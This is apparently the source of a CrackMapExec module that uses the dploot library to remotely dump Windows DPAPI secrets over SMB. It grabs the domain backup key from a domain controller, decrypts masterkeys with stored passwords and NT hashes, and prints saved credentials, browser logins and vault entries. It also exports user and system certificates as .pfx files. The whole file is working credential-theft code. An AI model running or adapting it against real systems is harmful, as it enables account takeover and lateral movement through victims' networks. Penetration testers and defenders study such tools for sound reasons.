#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from dploot.triage.certificates import CertificatesTriage
from dploot.triage.vaults import VaultsTriage
from dploot.triage.browser import BrowserTriage
from dploot.triage.credentials import CredentialsTriage
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.backupkey import BackupkeyTriage
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection

class CMEModule:
    name = "dpapi"
    description = "Remotely dump DPAPI stored secrets with dploot"
    supported_protocols = ["smb"]
    opsec_safe= True
    multiple_hosts = True

    def options(self, context, module_options):
        """
        PVK             Domain backup key file
        MKFILE          File with masterkeys in form of {GUID}:SHA1
        DC_IP           IP Address of the domain controller, will use to request domain backup key
        """
        self.pvkbytes = None
        self.dc_ip = None
        self.masterkeys = None

        if "PVK" in module_options:
            self.pvkbytes = open(module_options["PVK"], 'rb').read()

        if "MKFILE" in module_options:
            self.masterkeys = parse_masterkey_file(module_options["MKFILE"])
            self.pvkbytes = open(module_options["MKFILE"], 'rb').read() 

        self.use_dc = False
        if "DC_IP" in module_options:
            self.dc_ip = module_options["DC_IP"]
            self.use_dc = True
        pass

    def on_admin_login(self, context, connection):
        host = connection.host
        domain = connection.domain
        username = connection.username
        kerberos = connection.kerberos
        aesKey = connection.aesKey
        use_kcache = getattr(connection, "use_kcache", False)
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        if self.use_dc :
            dc = Target.create(
                domain=domain,
                username=username,
                password=password,
                target=self.dc_ip,
                dc_ip=self.dc_ip,
                lmhash=lmhash,
                nthash=nthash,
                do_kerberos=kerberos,
                aesKey=aesKey,
                use_kcache=use_kcache,
            )

            dc_conn = DPLootSMBConnection(dc)
            dc_conn.connect()

            if dc_conn.is_admin:
                context.log.info("Downloading Domain Backupkey")
                backupkey_triage = BackupkeyTriage(target=dc, conn=dc_conn)
                backupkey = backupkey_triage.triage_backupkey()
                self.pvkbytes = backupkey.backupkey_v2

        target = Target.create(
            domain=domain,
            username=username,
            password=password,
            target=host,
            dc_ip=self.dc_ip,
            lmhash=lmhash,
            nthash=nthash,
            do_kerberos=kerberos,
            aesKey=aesKey,
            use_kcache=use_kcache,
        )

        conn = DPLootSMBConnection(target)
        conn.connect()

        plaintexts = {username:password for _, _, username, password, _,_ in context.db.get_credentials(credtype="plaintext")}
        nthashes = {username:nt.split(':')[1] if ':' in nt else nt for _, _, username, nt, _,_ in context.db.get_credentials(credtype="hash")}

        context.log.info("Gathering masterkeys")

        masterkeys_triage = MasterkeysTriage(target=target, conn=conn, pvkbytes=self.pvkbytes, passwords=plaintexts, nthashes=nthashes)
        if self.masterkeys is None:
            self.masterkeys = masterkeys_triage.triage_masterkeys()
        self.masterkeys += masterkeys_triage.triage_system_masterkeys()

        context.log.info("Looting secrets")

        credentials_triage = CredentialsTriage(target=target, conn=conn, masterkeys=self.masterkeys)
        credentials = credentials_triage.triage_credentials()
        for credential in credentials:
            context.log.highlight("[CREDENTIAL] %s - %s:%s" % (credential.target, credential.username, credential.password))
        system_credentials = credentials_triage.triage_system_credentials()
        for credential in system_credentials:
            context.log.highlight("[CREDENTIAL] %s - %s:%s" % (credential.target, credential.username, credential.password))


        browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=self.masterkeys)
        browser_credentials, _ = browser_triage.triage_browsers()
        for credential in browser_credentials:
            context.log.highlight("[%s] %s - %s:%s" % (credential.browser.upper(), credential.url, credential.username, credential.password))

        vaults_triage = VaultsTriage(target=target, conn=conn, masterkeys=self.masterkeys)
        vaults = vaults_triage.triage_vaults()
        for vault in vaults:
            if vault.type == 'Internet Explorer':
                context.log.highlight("[Internet Explorer] %s - %s:%s" % (vault.resource, vault.username, vault.password))


        certificates_triage = CertificatesTriage(target=target,conn=conn, masterkeys=self.masterkeys)
        certificates = certificates_triage.triage_certificates()
        for certificate in certificates:
            filename = "%s_%s.pfx" % (certificate.username,certificate.filename[:16])
            context.log.success("Writting certificate to %s" % filename)
            with open(filename, "wb") as f:
                f.write(certificate.pfx)
        system_certificates = certificates_triage.triage_system_certificates()
        for certificate in system_certificates:
            filename = "%s_%s.pfx" % (certificate.username,certificate.filename[:16])
            context.log.success("Writting certificate to %s" % filename)
            with open(filename, "wb") as f:
                f.write(certificate.pfx)